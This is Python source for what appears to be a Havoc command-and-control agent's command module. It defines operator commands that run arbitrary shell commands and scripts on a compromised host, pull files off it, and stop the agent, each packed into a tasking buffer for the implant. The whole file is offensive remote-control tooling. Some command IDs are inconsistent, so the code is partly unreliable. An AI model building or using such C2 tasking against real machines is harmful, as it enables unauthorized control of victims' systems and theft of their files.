from havoc.service import HavocService
from havoc.agent import *

COMMAND_EXIT = 0x155
COMMAND_OUTPUT = 0x200
COMMAND_CAT_FILE = 0x156
COMMAND_SHELL = 0x152
COMMAND_SHELL_SCRIPT = 0x151
COMMAND_DOWNLOAD = 0x153


class CommandShellScript(Command):
    CommandId = COMMAND_SHELL_SCRIPT
    Name = "shell_script"
    Description = "execute script"
    Help = "shell_script bash /path/to/file/command.sh"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="shell_name",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="shell_path",
            is_file_path=True,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()
        Task.add_int(COMMAND_SHELL_SCRIPT)
        Task.add_int(len(arguments['shell_name']))
        Task.add_data(arguments['shell_name'])
        Task.add_int(len(arguments['shell_path']))
        Task.add_data(arguments['shell_path'])
        return Task.buffer


class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()
        Task.add_int(COMMAND_SHELL)
        Task.add_data(arguments['commands'])
        return Task.buffer


class CommandExit(Command):
    CommandId = COMMAND_EXIT
    Name = "exit"
    Description = "tells the python agent to exit"
    Help = ""
    NeedAdmin = False
    Mitr = []
    Params = []

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()
        Task.add_data("goodbye")

        return Task.buffer


class CommandDownload(Command):
    CommandId = COMMAND_CAT_FILE
    Name = "download"
    Description = "tells the agent to download file"
    Help = "download /path/to/file"
    NeedAdmin = False
    Mitr = []
    Params = [CommandParam(
        name="file_path",
        is_file_path=False,
        is_optional=False
    )]

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()
        Task.add_int(COMMAND_DOWNLOAD)
        Task.add_data(arguments['file_path'])
        return Task.buffer
